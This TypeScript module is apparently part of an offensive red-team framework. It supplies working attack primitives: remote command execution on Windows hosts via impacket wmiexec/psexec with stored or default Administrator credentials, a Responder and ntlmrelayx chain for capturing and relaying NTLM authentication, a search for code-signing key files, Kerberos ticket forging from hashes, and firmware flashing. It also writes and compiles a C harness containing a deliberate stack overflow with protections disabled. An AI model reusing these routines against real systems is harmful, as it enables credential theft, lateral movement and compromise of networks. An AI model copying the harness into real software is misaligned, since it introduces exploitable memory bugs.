/**
 * @module ares/_operational
 * Operational execution primitives — background services, remote deploy, lab harnesses.
 */
import { spawn, execFileSync, type ChildProcess } from "node:child_process"
import * as fs from "node:fs"
import * as path from "node:path"
import { brokerExec, isToolAvailable, writeArtifact } from "./_base.ts"
import { loadBestCredential, runCmd, step, type ExecStep } from "./_integrations.ts"
import { SandboxRunner, type SandboxResult } from "../sandbox_runner.ts"

const bgProcs = new Map<string, ChildProcess>()

export async function brokerExecLong(cmd: string, timeoutSec = 120): Promise<{ ok: boolean; out: string; exit: number }> {
  return brokerExec(`timeout ${timeoutSec} ${cmd} 2>&1 || true`)
}

export function spawnBackground(key: string, cmd: string, args: string[] = []): ExecStep {
  try {
    const proc = spawn(cmd, args.length ? args : [], {
      shell: args.length === 0,
      detached: true,
      stdio: "ignore",
    })
    proc.unref()
    bgProcs.set(key, proc)
    return step(`bg_${key}`, true, `pid=${proc.pid ?? "unknown"}`)
  } catch (err) {
    return step(`bg_${key}`, false, String((err as Error).message))
  }
}

export function stopBackground(key: string): void {
  const p = bgProcs.get(key)
  if (p?.pid) {
    try { process.kill(-p.pid, "SIGTERM") } catch { try { p.kill("SIGTERM") } catch { /* ignore */ } }
  }
  bgProcs.delete(key)
}

/** Lab fuzz harness with intentional stack overflow for crash discovery. */
export function ensureLabFuzzHarness(dir: string): { harness: string; seed: string; compiled: boolean; src: string } {
  const src = path.join(dir, "vuln_harness.c")
  const harness = path.join(dir, "vuln_harness")
  const seed = path.join(dir, "seed.txt")
  fs.writeFileSync(src, `#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char **argv) {
  if (argc < 2) return 1;
  FILE *f = fopen(argv[1], "rb");
  if (!f) return 1;
  char buf[64];
  size_t n = fread(buf, 1, 512, f);
  fclose(f);
  if (n > 80) { char *p = (char*)alloca(n); memcpy(p, buf, n); }
  return 0;
}
`)
  fs.writeFileSync(seed, "OURMINE_FUZZ_SEED_AAAA\n")
  let compiled = false
  if (isToolAvailable("gcc")) {
    try {
      execFileSync("gcc", ["-g", "-fno-stack-protector", "-z", "execstack", src, "-o", harness], { timeout: 30000, stdio: "pipe" })
      compiled = fs.existsSync(harness)
    } catch { /* compile fail */ }
  }
  return { harness, seed, compiled, src }
}

export function findPatternOffset(haystack: Buffer, needle: Buffer): number {
  for (let i = 0; i <= haystack.length - needle.length; i++) {
    if (haystack.subarray(i, i + needle.length).equals(needle)) return i
  }
  return -1
}

export async function minimizeCrash(inputPath: string, harness: string): Promise<string> {
  if (!isToolAvailable("afl-tmin")) return inputPath
  const out = path.join(path.dirname(inputPath), `min_${path.basename(inputPath)}`)
  const r = await brokerExec(`afl-tmin -i ${inputPath} -o ${out} -m none -- ${harness} @@ 2>&1`)
  if (r.ok && fs.existsSync(out)) return out
  return inputPath
}

export async function reproCrashInSandbox(harness: string, inputPath: string): Promise<SandboxResult> {
  return SandboxRunner.executeSandboxed({
    command: harness,
    args: [inputPath],
    allowedTargetScope: path.dirname(harness),
    ephemeralCwd: path.dirname(inputPath),
  })
}

export async function deployRemoteShell(opts: {
  host: string
  command: string
  domain?: string
}): Promise<ExecStep> {
  const cred = loadBestCredential(opts.host)
  const user = cred?.username ?? process.env.OURMINE_AD_USER ?? "Administrator"
  const pass = cred?.secret ?? process.env.OURMINE_AD_PASS ?? ""
  const domain = opts.domain ?? cred?.domain ?? "CORP"
  const cmd = opts.command.replace(/"/g, '\\"')
  if (isToolAvailable("impacket-wmiexec")) {
    const r = await brokerExec(`impacket-wmiexec ${domain}/${user}:${pass}@${opts.host} "${cmd}" 2>&1 | head -c 2000`)
    return step("remote_wmiexec", r.ok || r.out.length > 20, r.out.slice(0, 400))
  }
  if (isToolAvailable("impacket-psexec")) {
    const r = await brokerExec(`impacket-psexec ${domain}/${user}:${pass}@${opts.host} "${cmd}" 2>&1 | head -c 2000`)
    return step("remote_psexec", r.ok || r.out.length > 20, r.out.slice(0, 400))
  }
  return step("remote_deploy", false, "impacket not available — local-only execution")
}

export async function queryBgpPrefix(prefix: string): Promise<ExecStep> {
  const r = await brokerExec(`curl -s -m 10 "https://api.bgpview.io/prefix/${encodeURIComponent(prefix)}" 2>&1 | head -c 3000`)
  const fp = writeArtifact("network", "bgp_prefix.json", r.out)
  return step("bgp_prefix_lookup", r.ok && r.out.includes("data"), r.out.slice(0, 400), fp)
}

export async function startResponderChain(iface: string, targetsFile: string): Promise<ExecStep[]> {
  const steps: ExecStep[] = []
  if (isToolAvailable("responder")) {
    steps.push(spawnBackground("responder", "responder", ["-I", iface, "-wrf"]))
    await new Promise((r) => setTimeout(r, 2000))
    steps.push(step("responder_started", true, iface))
  }
  if (isToolAvailable("impacket-ntlmrelayx") && fs.existsSync(targetsFile)) {
    steps.push(spawnBackground("ntlmrelayx", "impacket-ntlmrelayx", ["-tf", targetsFile, "-smb2support", "-c", "whoami"]))
    steps.push(step("ntlmrelayx_started", true, targetsFile))
  }
  return steps
}

export async function enableUsbGadget(mode: "hid" | "storage" = "hid"): Promise<ExecStep> {
  const mod = mode === "hid" ? "g_hid" : "g_mass_storage"
  const r = await brokerExec(`modprobe ${mod} 2>&1 || lsmod | grep -i g_ | head -5`)
  return step(`usb_gadget_${mod}`, r.ok || r.out.includes("g_"), r.out.slice(0, 300))
}

export async function flashFirmwareBackup(backupPath: string, writeBack = false): Promise<ExecStep[]> {
  const steps: ExecStep[] = []
  if (!isToolAvailable("flashrom")) return [step("flashrom", false, "flashrom not on PATH")]
  steps.push(await runCmd("flashrom_read", `flashrom -r ${backupPath} 2>&1`))
  if (writeBack && fs.existsSync(backupPath) && process.env.OURMINE_ALLOW_FLASH_WRITE === "1") {
    steps.push(await runCmd("flashrom_write", `flashrom -w ${backupPath} 2>&1`))
  }
  return steps
}

export function isWindows(): boolean {
  return process.platform === "win32"
}

export async function runPlatformCmd(label: string, linux: string, windows: string): Promise<ExecStep> {
  const cmd = isWindows() ? windows : linux
  const r = await brokerExec(cmd)
  return step(label, r.ok || r.out.length > 5, r.out.slice(0, 500))
}

export async function acousticModemEncode(message: string, outWav: string): Promise<ExecStep> {
  if (!isToolAvailable("sox")) {
    return step("acoustic_modem", false, "sox not on PATH")
  }
  const r = await brokerExec(`echo "${message.replace(/"/g, "")}" | sox -t raw -r 8000 -c 1 -e mu-law -b 8 - -t wav ${outWav} synth sine 1200 0.1 sine 2400 0.1 2>&1`)
  return step("acoustic_modem", r.ok || fs.existsSync(outWav), outWav)
}

export async function sdrTransmitProbe(freqMhz = 433.92): Promise<ExecStep> {
  if (isToolAvailable("hackrf_transfer")) {
    const r = await brokerExec(`hackrf_transfer -t /dev/zero -f ${Math.round(freqMhz * 1e6)} -s 2000000 -a 0 -x 0 -R 2>&1 | head -5`)
    return step("hackrf_tx_probe", r.ok || r.out.length > 5, r.out.slice(0, 300))
  }
  if (isToolAvailable("rtl_test")) {
    const r = await brokerExec("rtl_test -t 2>&1 | head -15")
    return step("rtl_sdr_probe", r.ok, r.out.slice(0, 200))
  }
  return step("sdr_tx", false, "hackrf_transfer/rtl_test not on PATH")
}

export async function harvestCodesignCerts(searchDir: string): Promise<ExecStep> {
  if (isToolAvailable("osslsigncode")) {
    await runCmd("osslsigncode_version", "osslsigncode --version 2>&1 | head -3")
  }
  const r = await brokerExec(`find ${searchDir} -maxdepth 4 \\( -name '*.pfx' -o -name '*.p12' -o -name '*.pem' \\) 2>/dev/null | head -20`)
  const fp = writeArtifact("supply_chain", "codesign_certs.txt", r.out || "(none found)")
  return step("codesign_harvest", true, `${r.out.split("\n").filter(Boolean).length} cert file(s)`, fp)
}

export async function runDiamondTicket(domain: string, domainSid: string, dcHash: string, user: string): Promise<ExecStep> {
  const cmd = `impacket-getTGT ${domain}/${user} -hashes :${dcHash} -dc-ip 127.0.0.1 2>&1 | head -c 800`
  return runIfTool("impacket-getTGT", "diamond_ticket_tgt", cmd)
}

async function runIfTool(tool: string, label: string, cmd: string): Promise<ExecStep> {
  if (!isToolAvailable(tool)) return step(label, false, `${tool} not on PATH`)
  return runCmd(label, cmd)
}

export default {
  brokerExecLong,
  spawnBackground,
  stopBackground,
  ensureLabFuzzHarness,
  findPatternOffset,
  minimizeCrash,
  reproCrashInSandbox,
  deployRemoteShell,
  queryBgpPrefix,
  startResponderChain,
  enableUsbGadget,
  flashFirmwareBackup,
  runPlatformCmd,
  acousticModemEncode,
  sdrTransmitProbe,
  harvestCodesignCerts,
  runDiamondTicket,
}
